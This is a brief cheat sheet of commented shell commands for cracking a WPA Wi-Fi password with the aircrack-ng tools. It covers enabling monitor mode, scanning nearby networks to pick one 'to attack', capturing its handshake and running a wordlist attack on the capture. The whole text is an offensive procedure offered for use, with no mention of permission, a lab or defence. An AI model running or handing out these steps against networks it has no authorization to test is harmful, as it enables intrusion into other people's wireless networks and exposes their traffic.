# lists the network adaptors available and their properties. Note the name of your network adaptor that support monitoring, e.g., wlan1:
 iwconfig
# Change adaptor into monitor mode:
 airmon-ng start wlan1
# See the new adaptor:
 iwconfig
# Search for all wifi available for you to attack and mark the channel and mac address of the wifi you want to attack:
 airodump-ng wlan1mon 
# Capture wpa handshake: (EAPOL)
 airodump-ng -c <channel-no> -w <name-of-output-file> -d <mac-address> wlan1mon : 
# Crack the password:
 aircrack-ng output-above.cap -w wordlist.txt
